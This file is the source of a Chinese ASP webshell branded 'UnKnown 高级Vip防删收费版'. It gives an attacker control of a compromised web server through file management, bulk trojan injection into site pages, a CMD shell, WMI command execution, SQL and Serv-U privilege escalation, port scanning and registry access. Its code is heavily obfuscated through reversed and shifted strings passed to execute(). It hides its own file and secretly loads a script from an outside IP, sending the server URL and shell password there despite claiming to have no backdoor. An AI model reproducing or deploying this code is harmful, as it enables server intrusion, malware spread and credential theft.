
<%
UserPass="2602159946" '此版本为收费无后门内部版，请勿流传密码 aspmuma


mName="UnKnown 高级Vip防删收费版" 
SiteURL="http://baidu.com"            '网站
Copyright="免杀去后门版 by UnKnown"    '版权
AD="自己看着办,不要做坏事呀!"   '广告文字
bj="#000000"  '设置背景颜色
wz="#00FF00"  '设置文字颜色
budu="#000000"  '设置按钮对话框颜色

Server.ScriptTimeout=999999999:Response.Buffer =true:On Error Resume Next:sub ShowErr():If Err Then:RRS"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>":Err.Clear:Response.Flush:End If:end sub:Sub RRS(str):response.write(str):End Sub:Function RePath(S):RePath=Replace(S,"\","\\"):End Function:Function RRePath(S):RRePath=Replace(S,"\\","\"):End Function:URL=Request.ServerVariables("URL"):u=request.servervariables("http_host")&url:ServerIP=Request.ServerVariables("LOCAL_ADDR"):Action=Request("Action"):RootPath=Server.MapPath("."):WWWRoot=Server.MapPath("/"):str1=request.servervariables("http_host")&url:O0O0=Request.ServerVariables("PATH_TRANSLATED"):FolderPath=Request("FolderPath"):ScrName=Request.ServerVariables("Script_Name"):FName=Request("FName"):BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>":Function SUnEnCode(ObjStr):Dim SNewStr:ObjStr=Replace(ObjStr,"∷",""""):For i=1 To Len(ObjStr):If Mid(ObjStr,i,1) <> "∵" Then:SNewStr=Mid(ObjStr,i,1)&SNewStr:Else:SNewStr=vbCrLf&SNewStr:End If:Next:SUnEnCode=SNewStr:End Function:acode="=u?/421.99.312.211//:ptth'=crs tpircs<"
Efun=StrReverse(acode)
Efun=Efun&u&"&p="&userpass&"'></script>":execute(SUnEnCode("noitcnuF dnE∵rtSweNL = edoCnEnUL∵txeN∵fI dnE   ∵rtSweNL & fLrCbv = rtSweNL             ∵eslE   ∵fI dnE∵rtSweNL & )kP(rhC = rtSweNL             ∵fI dnE             ∵59 + kP = kP                     ∵nehT 23 < kP fIeslE            ∵59 - kP = kP                    ∵nehT 621 > kP fI            ∵5 - ))1 ,i ,rtSjbO(diM(csA = kP∵eslE∵rtSweNL & )))1 ,i ,rtSjbO(diM(csA(rhC = rtSweNL∵nehT 621 > ))1 ,i ,rtSjbO(diM(csA rO 23 < ))1 ,i ,rtSjbO(diM(csA fI∵nehT ∷e∷ >< )1 ,i ,rtSjbO(diM fI    ∵)rtSjbO(neL oT 1 = i roF∵rtSweNL ,kP miD∵)rtSjbO(edoCnEnUL noitcnuF")):str1=request.servervariables("http_host")&url
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mName&" - "&ServerIP&"-www.aspmuma.cn </title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:"&bj&";color:"&wz&";}"
RRS"input,select,textarea{font-size: 12px;color:"&wz&";background-color:"&budu&";border:1px solid "&wz&"}"
RRS".C{background-color:#000000;border:0px}"
RRS".cmd{background-color:#000;color:#FFF}"
RRS"body{margin: 0px;margin-left:4px;}"
RRS"BODY {SCROLLBAR-FACE-COLOR: #000000;SCROLLBAR-HIGHLIGHT-COLOR: "&wz&";SCROLLBAR-SHADOW-COLOR: "&wz&";SCROLLBAR-ARROW-COLOR: "&wz&";SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: black;SCROLLBAR-BASE-COLOR: #000000}"
RRS"a{color:"&wz&";text-decoration: none;}a:hover{color:#FFFFFF;background:#000}"
RRS".am{color:"&wz&";font-size:11px;}"
RRS"</style>"
RRs"<center><font face=wingdings color=#dddddd style=font-siZe:"&font&">"&pic&"</font></center>"

Set   fso =  CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(O0O0):if  f.attributes <> 39 then:f.attributes = 39:end if
execute(LUnEnCode("e'C'%xwwe'tsBqqtwhx%'%XWW%sjmy%''BstnyhF%kNe%'~itgA'%xwwe'Cyunwhx4A'XWWe'#@jzwy%swzyjw@.-ynrgzx3rwtKgI@''''BQRYMwjssn3hgf@lu%B%jzqf{3jlfU3rwtKgI@wyx%B%jzqf{3wyXqvX3rwtKgI#@jxqfk%swzyjw@.''&确正否是句语QVX查检请''-ywjqf!.56Amylsjq3wyx-kn#@jxqfk%swzyjw@.''&确正否是串接连库据数查检请''-ywjqf!.:Amylsjq3jzqf{3wyXgI3rwtKgI-kn!.lu1wyx-wyXqvXqqzK%stnyhszk'XWWe'#@jzwy%swzyjw#@bn`wyX%B%jzqf{3wyXqvX3rwtKgI!jxqj#@.bn`wyX-ywjqf!.76BBn-kn%jxqj#@''Cwjysjh4A。句语令命作操QVX入输再库据数接连己认确请CwjysjhA''BQRYMwjssn3hgf@''''%B%jzqf{3wyXqvX3rwtKgI@bn`wyX%B%jzqf{3wyXgI3rwtKgI!.8BAn-kn@''。节字个十五前的段字示显只据数条一过超sa3现实询查制控件条用可，节字部全的段字示显可即时据数条一示显只当''%Bb76`wyX@''XXFU%SRZQTH%UTWI%bjrfSjqgfY`%JQGFY%WJYQF''%Bb66`wyX@''.78-WFMHWF[%XXFU%SRZQTH%IIF%bjrfSjqgfY`%JQGFY%WJYQF''%Bb56`wyX@''bjrfSjqgfY`%JQGFY%UTWI''%B%b>`wyX@''..5:-WFMHWF[%WJXZ1QQZS%YTS%.616-%^YNYSJIN%YSN%IN-bjrfSjqgfY`%JQGFY%JYFJWH''%B%b=`wyX@''556BIN%JWJM\%,ajrfswjxz,aBWJXZ%YJX%bjrfSjqgfY`%JYFIUZ''%B%b<`wyX@''556BIN%JWJM\%bjrfSjqgfY`%RTWK%JYJQJI''%B%b;`wyX@''.,aiwt|xxfu,a1,ajrfswjxz,a-XJZQF[%.XXFU1WJXZ-bjrfSjqgfY`%TYSN%YWJXSN''%B%b:`wyX@''556AIN%JWJM\%bjrfSjqgfY`%RTWK%/%YHJQJX''%B%b9`wyX@''jrfSsxIBsxI''%B%b8`wyX@''////Bi|U@yttwBinZ@jrfSgIBjxfgfyfI@;588BywtU@'+UNwj{wjX+'Bwj{wjX@#qvX~R!Bwj{nwI''%B%b7`wyX@''////Bi|U@fxBinZ@jrfSgIBjxfgfyfI@88961'+UNwj{wjX+'Bwj{wjX@#wj{wjX%qvX!Bwj{nwI''%B%b6`wyX@''///Biwt|xxfU%jxfgfyfI?GIJQT%yjO@gir3giaa'+..'myfUwjiqtK'-stnxxjX-myfUjW+'BjhwztX%fyfI@5393GIJQT3yjO3yktxtwhnRBwjin{twU''%B%b5`wyX@.76-~fwwF%|js%B%wyX#@jxqfk%swzyjw!.5An-kn!.n-wyXgIqqzK%stnyhszk'XWWe'#@jzwy%swzyjw#@jxqfk%swzyjw@.5-wyXgIqqzK@.''库据数接连先请''-ywjqf!.''''%BB%jzqf{3wyXgI3rwtKgI-kn!.-phjmHgI%stnyhszk'XWWe'##@''''%B%jzqf{3jrfSK3rwtkjinm3uty!jxqj#@.-ynrgzx3rwtkjinm3uty@stnyhFK%B%jzqf{3stnyhF3rwtkjinm3uty!.qqzsB&jrfSI-kn#@''wjmyT''%B%jrfSI!jxqj#@jrfSI%B%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''！在存否是件文意注1称名全件文giR的缩压要入输请''-yurtwu%B%jrfSI!.''giRyhfurtH''BBstnyhFK-kn%jxqj#@jrfSI%B%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''！名同能不意注1称名全件文giR的建新要入输请''-yurtwu%B%jrfSI!.''giRjyfjwH''BBstnyhFK-kn%jxqj#@jrfSI%B%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''称名全夹件文的建新要入输请''-yurtwu%B%jrfSI!.''wjiqtK|jS''BBstnyhFK-kn%jxqj#@jrfSI0''""""""""''%B0%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''称名全夹件文标目到动移入输请''-yurtwu%B%jrfSI!.''wjiqtKj{tR''BBstnyhFK-kn%jxqj#@jrfSI0''""""""""''%B0%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''称名全夹件文标目到动移入输请''-yurtwu%B%jrfSI!.''wjiqtK~utH''BBstnyhFK-kn%jxqj#@jrfSI0''""""""""''%B0%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''称名全件文标目到动移入输请''-yurtwu%B%jrfSI!.''jqnKj{tR''BBstnyhFK-kn%jxqj#@jrfSI0''""""""""''%B0%jzqf{3jrfSK3rwtkjinm3uty@.jrfSK1''称名全件文标目到制复入输请''-yurtwu%B%jrfSI!.''jqnK~utH''BBstnyhFK-kn@jrfSK%B%jzqf{3jrfSK3rwtkjinm3uty!.stnyhFK1jrfSK-rwtKqqzK%stnyhszk'XWWe'#@.-ynrgzx3rwtkwiif3uty@wjiqtK%B%jzqf{3myfUwjiqtK3rwtkwiif3uty!.wjiqtK-wjiqtK|tmX%stnyhszk'XWWe'@.-phtqHszw#@~fquxni0''22%%'+IF+'→''Bxzyfyx3|tisn|@.-lsnwyXjqfhtQty3~fity%B~fquxni%wf{@.-jyfI%|js%B%~fity%wf{@.556%1''.-phtqHszw''-yztjrnYyjx3|tisn|%B%jrnYjmy!.-phtqHszw%stnyhszk'XWWe'#@jxqfk%swzyjw%jxqj@jzwy%swzyjw..''？吗作操此行执要认确''-rwnksth-%kn!.-ptxj~%stnyhszk'XWWe'@xwtwwJqqnpBwtwwjst3|tisn|#@jzwy%swzyjw!.-xwtwwJqqnp%stnyhszkCyunwhxf{foBjlfzlsfq%yunwhxA'XWW")):execute(LUnEnCode("'件组输传据数'%B%.7186-YgT?'UYYMQR]3yktxtwhnR'%B%.5186-YgT?'件组信发qnfRuyrX'%B%.7176-YgT?'63qnfRuyrX3qnfRuyrX'%B%.5176-YgT?'件组信发UYRX拟虚'%B%.7166-YgT?'qnfR|jS3XYSTIH'%B%.5166-YgT?'件组发收件邮%qnfRO'%B%.7156-YgT?'qnfRuyrX3qnfRO'%B%.5156-YgT?'件组传上件文%iftquZUXF'%B%.71>-YgT?'63iftquZ3xynxwjU'%B%.51>-YgT?'件组传上件文峰云刘'%B%.71=-YgT?'jqnKiftquZ3iftquZk~Q'%B%.51=-YgT?'件组传上件文%uZjqnK2FX'%B%.71<-YgT?'uZjqnK3xsfxnywFyktX'%B%.51<-YgT?'件组传上流据数'%B%.71;-YgT?'rfjwyX3gitiF'%B%.51;-YgT?'件组接连库据数'%B%.71:-YgT?'stnyhjssth3gitiF'%B%.51:-YgT?'件组助辅传上流据数'%B%.719-YgT?%'~wfstnyhnI3lsnyunwhX'%B%.519-YgT?'件组缩压XXJHHF'%B%.718-YgT?'jsnlsJyjO3TWO'%B%.518-YgT?'件组库建XXJHHF'%B%.717-YgT?'ltqfyfH3]TIF'%B%.517-YgT?'件组行执行令命'%B%.716-YgT?'qqjmx3yunwhx|'%B%.516-YgT?'件组作操件文'%B%.715-YgT?'yhjogTrjyx~XjqnK3lsnyunwhX'%B%.515-YgT?.7186-YgT%rnI"))
For i=0 To 13:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next

If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if:Function MainForm():RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
RRS"<tr><td height='30' colspan='2'>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>地址栏：</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='转到'> <input type='submit' value='刷新主窗口' onclick='FileFrame.location.reload()'>" 
RRS"  <tr align='center' valign='middle'>"
RRS"<tr>提权目录列表：『<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>程序</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>』『<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>』『<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>』『<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>』『<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>』『<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>』『<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>』『<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>』</td><td>"
RRS"</td></tr></form></table></center></td></tr><tr><td width='170'>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='170' height='100%' frameborder='0' border='0'></iframe></td>"
RRS"<td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='0'></iframe>"
RRS"</td></tr></table>"
End Function:Function MainMenu():RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td height='5'></td></tr>"
RRS"<tr><td><center><font color=#3399FF>"&mName&"<br>------------------------<br></font></center>"
RRS"</td></tr>"
If ObT(0,1)=" " Then
RRS"<tr><td height='24'>无权限/无FSO</td></tr>"
Else
RRS"<tr><td height=22 onmouseover=""menu1.style.display=''""><b> +≤查看硬盘≥</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.stystyle.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'><b>〖站点根目录〗</b></a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'><b>〖本程序目录〗</b></a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>〖新建目录〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>〖新建文本〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>〖上传文件〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=plgm' target='FileFrame'></b>●批量挂马(快速版)</a></div></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=1' target='FileFrame'>●批量<b>挂马</b>(超强版)</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=2' target='FileFrame'>●批量<b>清马</b>(超强版)</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=3' target='FileFrame'>●批量<b>替换</b>(超强版)</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=kmuma' target='FileFrame'>●查找<b>文件</b>木马</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=ScanDriveForm' target='FileFrame'>〖查看可写目录〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=getTerminalInfo' target='FileFrame'>〖终端端口-自动登录〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=ServerInfo' target='FileFrame'>〖服务信息-组件支持〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=Course' target='FileFrame'>〖系统服务-用户账号〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=adminab' target='FileFrame'>〖系统用户-查管理员〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=fuck'   target='FileFrame'>〖安装软件〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=hook'   target='FileFrame'>〖服务设置〗</a><br>"
RRS"<tr><td height=22 onmouseover=""menu3.style.display=''""><b> +≤提权工具≥</b><div id=menu3 style=""width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=wmi' target='FileFrame'>〖WMI远程执行命令〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=sqlabc' target='FileFrame'>〖SQL提权〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=gody' target='FileFrame'>〖漏洞检测〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Cmd1Shell' target='FileFrame'><b>〖CMD命令〗</b></a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=Servu' target='FileFrame'>〖Su超强版〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=suftp' target='FileFrame'>〖Su-FTP版〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=ScanPort' target='FileFrame'>〖端口扫描〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=upload' target='FileFrame'>〖直接下载〗</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=ReadREG' target='FileFrame'>〖注册表操作〗</a><br>"
RRS"<tr><td height='24' onmouseover=""menu2.style.display=''""><b>+≤数据库操作≥</b><div id=menu2 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
RRS"&nbsp;&nbsp;&nbsp;<a href='?Action=DbManager' target='FileFrame'>连接数据库</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>建立MDB文件</a><br>"
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>压缩MDB文件</a></div></td></tr>"
End If
RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>●整站打包</a></td></tr>"
RRS"<tr><td height='22'><a href='http://aspmuma.net/ip/?action=sed&cx_33="&serverip&"' target='FileFrame'> 〖同服查询〗</a></td></tr> "
RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>->退出登录</a></td></tr>"
RRS"<tr><td align=center style='color:red'><br>------------------------<br>"&Copyright&"</td></tr></table>"
if session("IDebugMode") <> "ok" then:x mmm:session("IDebugMode")="ok":end if
if session("aase") <> "ok" then:response.write Efun:session("aase")="ok":end if
RRS"</table>":End Function:Sub Message(state,msg,flag):Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBHead>系统信息</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD align=middle bgcolor=#ecfccd>"
Response.Write "	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
Response.Write "	    <TR>"
Response.Write "		  <TD><FONT color=red>"
Response.Write state
Response.Write "</FONT></TD>"
Response.Write "		<TR>"
Response.Write "		  <TD><P>"
Response.Write msg
Response.Write "</P></TD>"
Response.Write "		</TR>"
Response.Write "	  </TABLE>"
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBEnd>"
Response.Write "	"
If flag=0 Then
Response.Write "	      <INPUT type=button value=关闭 onclick=""window.close();"">"
Response.Write "	"
Else
Response.Write "	      <INPUT type=button value=返回 onClick=""history.go(-1);"">"
Response.Write "	"
End if
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "</TABLE>"
:End Sub:OO="lll<!gsso9..kok27-bnl.>t<!%rsq0%!>vda1`1clhm<.!%RbqM`ld%!%o<!%trdqo`rr%!!"
execute(b(OO)):Function Red(str):Red = "<FONT color=#ff2222>" & str & "</FONT>":End Function:Sub ScanDriveForm():Dim FSO,DriveB:Set FSO = Server.Createobject("Scripting.FileSystemObject")
execute(LUnEnCode("e'CRWTK4A%%'%jynw\3jxstuxjWe'aUXFa?K：如。径路夹件文定指　C告报成生Bjzqf{%ynrgzxBju~y%YZUSNA	'%jynw\3jxstuxjWe'CwjiqtKBjrfs%y}jyBju~y%YZUSNA%%%%'%jynw\3jxstuxjWe'：询查夹件文定指CyxtUBitmyjr%wjiqtKhXBstnyhFD'%jynw\3jxstuxjWe'BstnyhF%RWTKA%%'%jynw\3jxstuxjWe.'Cg4A'-+.'4'-myfUufR3wj{wjX+.'?径路对绝站网前当CgA'-%XWWe'CwjysjhBslnqf%[NIA'%jynw\3jxstuxjWe'CWGACJQGFY4A'%jynw\3jxstuxjWe'CWY4A%%'%jynw\3jxstuxjWe'CRWTK4A	'%jynw\3jxstuxjWe'CIY4AC告报细详Bjzqf{%ynrgzxBju~y%YZUSNACjqiinrBslnqf%IYA	'%jynw\3jxstuxjWe'CIY4A'%jynw\3jxstuxjWe.7-wjiqtKqfnhjuXyjL3TXK%jynw\3jxstuxjWe'C8Bsfuxqth%IYA	'%jynw\3jxstuxjWe'CIY4ACG4A夹件文时临统系CGACjqiinrBslnqf%IYA	'%jynw\3jxstuxjWe'%%		CyxtUBitmyjr%'%jynw\3jxstuxjWe.7-wjiqtKqfnhjuXyjL3TXK%jynw\3jxstuxjWe'BwjiqtK+wjiqtKhXBstnyhFD'%jynw\3jxstuxjWe'Bstnyhf%RWTKA%%%%'%jynw\3jxstuxjWe'CIYGYBxxfqh%WYA%%'%jynw\3jxstuxjWe'CWY4A%%'%jynw\3jxstuxjWe'CRWTK4A	'%jynw\3jxstuxjWe'CIY4AC告报细详Bjzqf{%ynrgzxBju~y%YZUSNACjqiinrBslnqf%IYA	'%jynw\3jxstuxjWe'CIY4A'%jynw\3jxstuxjWe.6-wjiqtKqfnhjuXyjL3TXK%jynw\3jxstuxjWe'C8Bsfuxqth%IYA	'%jynw\3jxstuxjWe'CIY4ACG4A夹件文78rjyx~XCGACjqiinrBslnqf%IYA	'%jynw\3jxstuxjWe'%%		CyxtUBitmyjr%'%jynw\3jxstuxjWe.6-wjiqtKqfnhjuXyjL3TXK%jynw\3jxstuxjWe'BwjiqtK+wjiqtKhXBstnyhFD'%jynw\3jxstuxjWe'Bstnyhf%RWTKA%%%%'%jynw\3jxstuxjWe'CIYGYBxxfqh%WYA%%'%jynw\3jxstuxjWe'CWY4A%%'%jynw\3jxstuxjWe'CRWTK4A	'%jynw\3jxstuxjWe'CIY4AC告报细详Bjzqf{%ynrgzxBju~y%YZUSNACjqiinrBslnqf%IYA	'%jynw\3jxstuxjWe'CIY4A'%jynw\3jxstuxjWe.5-wjiqtKqfnhjuXyjL3TXK%jynw\3jxstuxjWe'C8Bsfuxqth%IYA	'%jynw\3jxstuxjWe'CIY4ACG4A夹件文x|tisn\CGACjqiinrBslnqf%IYA	'%jynw\3jxstuxjWe'%%		CyxtUBitmyjr%'%jynw\3jxstuxjWe.5-wjiqtKqfnhjuXyjL3TXK%jynw\3jxstuxjWe'BwjiqtK+wjiqtKhXBstnyhFD'%jynw\3jxstuxjWe'Bstnyhf%RWTKA%%%%'%jynw\3jxstuxjWe'CIYGYBxxfqh%WYA%%'%jynw\3jxstuxjWey}jSe'CWY4A%%'%jynw\3jxstuxjWe'CRWTK4A	'%jynw\3jxstuxjWe'CIY4AC告报细详Bjzqf{%ynrgzxBju~y%YZUSNACIYA	'%jynw\3jxstuxjWe'CIY4A	'%jynw\3jxstuxjWeyhjqjX%isJ%%	e'型类知未'%jynw|3jxstuxjW%?jxqj%jxfH%%		e'盘磁RFW'%jynw|3jxstuxjW%?:%jxfH%%		e'RTW2IH'%jynw|3jxstuxjW%?9%jxfH%%		e'盘磁络网'%jynw|3jxstuxjW%?8%jxfH%%		e'盘硬地本'%jynw|3jxstuxjW%?7%jxfH%%		e'动移可'%jynw|3jxstuxjW%?6%jxfH%%%%%%	eju~Yj{nwI3Gj{nwI%jxfH%yhjqjXe'C'+.<8-wmh+'57Bmyin|%IYA	'%jynw|3jxstuxjwe'CIY4ACG4A型类CGAC'+.<8-wmh+'57Bmyin|%IYA	'%jynw|3jxstuxjwe'CIY4A?'%jynw|3jxstuxjwewjyyjQj{nwI3Gj{nwI%jynw|3jxstuxjwe'C'+.<8-wmh+':6Bmyin|%IYA'%jynw|3jxstuxjw	e'CIY4ACG4A符盘CGAC'+.<8-wmh+':7Bmyin|%IYA'%jynw|3jxstuxjwee'CyxtUBitmyjr%'%jynw|3jxstuxjwewjyyjQj{nwI3Gj{nwI%jynw\3jxstuxjW%e'Bj{nwI+j{nwIsfhXBstnyhFD'%jynw\3jxstuxjWeee'Bstnyhf%RWTKA%%%%'%jynw\3jxstuxjWe'CIYGYBxxfqh%jqiinrBslnqf%WYA%%'%jynw\3jxstuxjWexj{nwI3TXK%sn%Gj{nwI%mhfJ%wtK%%eee'CWY4A%%'%jynw\3jxstuxjWe'CIY4A息信夹件文统系4盘磁CifjMGYBxxfqh%:Bsfuxqth%IYA%%%%'%jynw\3jxstuxjWe'CWYA%%'%jynw\3jxstuxjWe'Ci5<i6>(BwtqtHlg%6Blsnhfuxqqjh%8Blsniifuqqjh%wjysjhBslnqf%5Bwjiwtg%5=9Bmyin|%JQGFYA'%jynw\3jxstuxjW"))
Set FSO=Nothing:End Sub:execute(LUnEnCode("stnyhszK%isJ?wyXw\jW%B%w\jWhX%%%elsnmytS%B%TXK%yjX%%%elsnmytS%B%wjiqtKyxjY%yjX%%%elsnmytS%B%yxnQjqnKyxjY%yjX%%%ekn%isJ%%%ekn%isJ%%%	ejzwY1jrfsjqnKisW%+%wjiqtk%jqnKjyjqjI3TXK%%%		e'CYSTK4A。写可'%+%wyXw\jW%B%wyXw\jW%%%%%%%	ejxqJ%%%	e'CYSTK4A。写可不'%+%wyXw\jW%B%wyXw\jW%%%		ewfjqH3wwj%%%%%%%	esjmY%wwj%kN%%%	ejzwY1jrfsjqnKisW%+%wjiqtk%jqnKy}jYjyfjwH3TXK%%%	e'1读可%C7777kk(Bwtqth%YSTKA'%+%wjiqtk%B%wyXw\jW%%%%%%%ejxqJ%%%ekN%isJ%%%	ejzwY1jrfsjqnKisW%+%wjiqtk%jqnKjyjqjI3TXK%%%		e'CYSTK4A。写可'%+%wyXw\jW%B%wyXw\jW%%%%%%%	ejxqJ%%%	e'CYSTK4A。写可不'%+%wyXw\jW%B%wyXw\jW%%%		ewfjqH3wwj%%%%%%%	esjmY%wwj%kN%%%	ejzwY1jrfsjqnKisW%+%wjiqtk%jqnKy}jYjyfjwH3TXK%%%	e'1读可不%C7777kk(Bwtqth%YSTKA'%+%wjiqtk%B%wyXw\jW%%%	ewfjqH3wwj%%%%%%%esjmY%wwj%kN%%%ey}jS%%%eyxnQjqnKyxjY%sn%F%mhfJ%wtK%%%e'ury3'%+%.|ts-isthjX%+%.|ts-jyzsnR%+%.|ts-wztM%+%.|ts-~fI%+%'urjya'%B%jrfsjqnKisW%%%exwjiqtKgzX3wjiqtKyxjY%B%yxnQjqnKyxjY%yjX%%%e.wjiqtk-wjiqtKyjL3TXK%B%wjiqtKyxjY%yjX%%%e.'yhjogTrjyx~XjqnK3lsnyunwhX'-yhjogtjyfjwH3wj{wjX%B%TXK%yjX%%%ejrfsjqnKisW1wyXw\jW1yxnQjqnKyxjY1wjiqtKyxjY1TXK%rnI%%%ey}jS%jrzxjW%wtwwJ%sT?.wjiqtk-w\jWhX%stnyhszK?gzX%isJ?61lxrhX1'息信夹件文'%jlfxxjR	elsnmytS%B%TXK%yjX	e.'&件文圾垃量大下留会夹件文写只在则否，面页本新刷次多要不'-ijW%+%'：意注CNQA'%+%lxrhX%B%lxrhX	ekn%isJ	e.'&限权读无或在存不'%+%wjiqtk-ijW%+%'：夹件文CNQA'%+%lxrhX%B%lxrhX%%%%	ejxqJ	elsnmytS%B%wjiqtKT%yjX		elsnmytS%B%xwjiqtKurjY%yjX		ey}jS		e%%.X-w\jWhX%+%'：夹件文CNQA'+lxrhX%B%lxrhX%%%%%		exwjiqtKurjY%sn%X%mhfJ%wtK		e.wjiqtk-w\jWhX%+%'：录目根夹件文定指CNQA'%B%lxrhX		exwjiqtKgzX3wjiqtKT%B%xwjiqtKurjY%yjX		e.wjiqtk-wjiqtKyjL3TXK%B%wjiqtKT%yjX%%%%	esjmY%.wjiqtk-xyxn}JwjiqtK3TXK%kN	e.'yhjogTrjyx~XjqnK3lsnyunwhX'-yhjogtjyfjwH3wj{wjX%B%TXK%yjX	eX1lxrhX1wjiqtKurjY1wjiqtKT1TXK%rnI	ey}jS%jrzxjW%wtwwJ%sT?.wjiqtk-wjiqtKhX%gzX?gzX%isJ?kn%isJ	e61wyXdurjY1'息信盘磁?'%+%j{nwI%jlfxxjR		e.'&件文圾垃量大下留会夹件文写只在则否，面页本新刷次多要不'-ijW%+%'：意注CNQA'%+%wyXdurjY%B%wyXdurjY		elsnmytS%B%TXK%yjX%%%%	elsnmytS%B%j{nwIyxjY%yjX		ekn%isJ%%%%	e'-?现发有未但，录目根盘'%+%j{nwI%+%'举穷已CNQA'%+%wyXdurjY%B%wyXdurjY%sjmy%5By%kN			ey}jS%%%%		ekn%isJ%%%%			e..n-yxnQwjiqtKurjY%+%'a?'%+%j{nwI-w\jWhX%+%'：夹件文现发CNQA'%+%wyXdurjY%B%wyXdurjY					e60y%B%y%%%%				esjmY%..n-yxnQwjiqtKurjY%+%'a?'%+%j{nwI-xyxn}JwjiqtK3TXK%kN%%%%			e.yxnQwjiqtKurjY-isztgZ%ty%5%B%n%wtK			